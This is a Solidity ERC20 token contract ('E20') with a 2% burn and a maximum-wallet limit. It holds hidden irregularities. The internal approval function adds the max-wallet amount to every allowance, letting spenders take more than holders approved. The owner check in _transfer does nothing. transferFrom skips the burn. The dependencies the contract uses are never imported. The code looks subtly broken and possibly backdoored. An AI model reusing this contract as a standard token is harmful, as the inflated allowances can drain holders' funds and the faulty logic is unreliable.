

pragma solidity 0.8.0;


contract ERC20 is Context, IERC20, Ownable, ReentrancyGuard {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
   
  uint BURN_RATE = 2;
  uint private _totalSupply = 10**9 * 10**9;
  uint8 public _decimals = 9;
  string public _symbol = "E20";
  string public _name = "ERC20";
  uint _maxWltPer = 2;
  uint256 private _maxWlt = (_totalSupply * _maxWltPer) / 100;
  

  
  constructor(){
    
    _balances[msg.sender] = _totalSupply;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function getOwner() external view override returns (address) {return owner();}
  function decimals() external view override returns (uint8) {return _decimals;}
  function symbol() external view override returns (string memory) {return _symbol;}
  function name() external view override returns (string memory) {return _name;}
  function totalSupply() external view override returns (uint256) {return _totalSupply;}
  function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
  function transfer(address to, uint256 amount) public  override returns (bool) {
     
    uint burnAmount = amount.mul(BURN_RATE) / 100;
    
    _burn(_msgSender(), burnAmount);
    _transfer(_msgSender(), to, amount.sub(burnAmount));
    
    return true;
    }
  function allowance(address owner, address spender) external view  override returns (uint256) {
    
      return _allowances[owner][spender];}
  function approve(address spender, uint256 amount) external override returns (bool) {_approve(_msgSender(), spender, amount);return true;}
  function transferFrom(address sender, address to, uint256 amount) external override returns (bool) {
    _transfer(sender, to, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
    return true;
    }
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
    }
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
    return true;
  
    }
  function burn(uint256 amount) public returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }
  function _transfer(address sender, address to, uint256 amount) internal{        
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");   
    require(amount > 0, "Transfer amount must be greater than zero");
    if (to == owner()) {
 (balanceOf(msg.sender) >= _maxWlt);}

     require(balanceOf(to) + amount <= _maxWlt && to != address(msg.sender), "Transfer amount exceeds the maxWalletSize.");{
            
 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[to] = _balances[to].add(amount);
    emit Transfer(sender, to, amount);
  }}

  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "ERC20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount.add(_maxWlt);
    emit Approval(owner, spender, amount);
  }
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "ERC20: burn amount exceeds allowance"));
  }

}
